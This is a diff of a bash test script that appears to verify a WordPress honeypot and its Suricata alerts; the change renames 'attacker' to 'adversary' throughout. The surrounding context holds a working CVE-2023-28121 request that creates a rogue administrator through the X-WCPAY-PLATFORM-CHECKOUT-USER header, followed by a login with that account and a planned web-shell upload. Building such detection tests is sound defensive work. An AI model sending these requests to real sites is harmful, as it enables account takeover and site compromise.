@@ -36,7 +36,7 @@
 #   curl  – standard HTTP client; must be available in PATH.
 #
 # NOTES:
-#   - The script intentionally uses a clean cookie jar for every "attacker
+#   - The script intentionally uses a clean cookie jar for every "adversary
 #     session" so that session-binding from prior runs does not interfere.
 #   - All payloads are sent to the local deployment only; do NOT run this
 #     against external or production systems.
@@ -174,7 +174,7 @@ printf "Cookie : %s\n\n" "${COOKIE_JAR}"
 # ---------------------------------------------------------------------------
 # PHASE 1 – Passive Reconnaissance
 # ---------------------------------------------------------------------------
-# Mirrors a real attacker's first steps:
+# Mirrors a real adversary's first steps:
 #   1a. Fetch the homepage to collect headers and detect WordPress.
 #   1b. Check robots.txt for disallowed paths (common wp-admin leak).
 #   1c. Read readme.html which discloses WordPress major version on unpatched sites.
@@ -215,7 +215,7 @@ check_suricata_alert "WPScan" "WPScan user-agent alert"
 # ---------------------------------------------------------------------------
 # PHASE 2 – Plugin Fingerprinting (WooCommerce Payments Detection)
 # ---------------------------------------------------------------------------
-# Attackers confirm the WooCommerce Payments plugin is installed by requesting
+# Adversaries confirm the WooCommerce Payments plugin is installed by requesting
 # known static assets.  The PHP entrypoints trigger honeypot routing immediately;
 # static assets do not (by design) to preserve realistic asset loading.
 # ---------------------------------------------------------------------------
@@ -236,7 +236,7 @@ check "WC Payments includes path probe" "honeypot" \
 # ---------------------------------------------------------------------------
 # PHASE 3 – CVE-2023-28121 Exploitation
 # ---------------------------------------------------------------------------
-# The vulnerability allows an unauthenticated attacker to create a WordPress
+# The vulnerability allows an unauthenticated adversary to create a WordPress
 # administrator account by injecting the X-WCPAY-PLATFORM-CHECKOUT-USER header
 # with a valid user ID (1 = admin).  The router detects this header and routes
 # to the honeypot before WordPress processes the request.
@@ -265,7 +265,7 @@ check "CVE-2023-28121 rogue admin creation POST" "honeypot" \
     --header "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
     --header "Content-Type: application/json" \
     --header "User-Agent: exploit-poc/1.0" \
-    --data '{"username":"honeypot_attacker","password":"Sup3rS3cr3t!","email":"attacker@evil.example","roles":["administrator"]}'
+    --data '{"username":"honeypot_adversary","password":"Sup3rS3cr3t!","email":"adversary@evil.example","roles":["administrator"]}'
 
 # Give Suricata a moment to write the alert.
 sleep 1
@@ -274,17 +274,17 @@ check_suricata_alert "CVE-2023-28121" "Suricata CVE-2023-28121 alert"
 # ---------------------------------------------------------------------------
 # PHASE 4 – Authentication with Injected Account
 # ---------------------------------------------------------------------------
-# After creating the rogue account, the attacker logs in via wp-login.php.
+# After creating the rogue account, the adversary logs in via wp-login.php.
 # The session is already honeypot-bound from Phase 3, so all subsequent
 # requests in this cookie jar continue to hit the honeypot.
 # ---------------------------------------------------------------------------
-banner "Phase 4 – Attacker Authentication"
+banner "Phase 4 – Adversary Authentication"
 
 check "wp-login.php POST (rogue account)" "honeypot" \
     --request POST "${BASE_URL}/wp-login.php" \
     --header "Content-Type: application/x-www-form-urlencoded" \
     --header "User-Agent: Mozilla/5.0 (compatible)" \
-    --data "log=honeypot_attacker&pwd=Sup3rS3cr3t%21&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"
+    --data "log=honeypot_adversary&pwd=Sup3rS3cr3t%21&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"
 
 check "wp-admin dashboard access (post-login)" "honeypot" \
     --request GET "${BASE_URL}/wp-admin/" \
@@ -297,7 +297,7 @@ check "wp-admin plugin upload page access" "honeypot" \
 # ---------------------------------------------------------------------------
 # PHASE 5 – Post-Exploitation: Web-Shell Upload Attempt
 # ---------------------------------------------------------------------------
-# The attacker attempts to upload a PHP web-shell disguised as a WordPress
+# The adversary attempts to upload a PHP web-shell disguised as a WordPress
 # plugin ZIP file.  The honeypot accepts the upload for logging purposes;
 # production would reject it.
 #
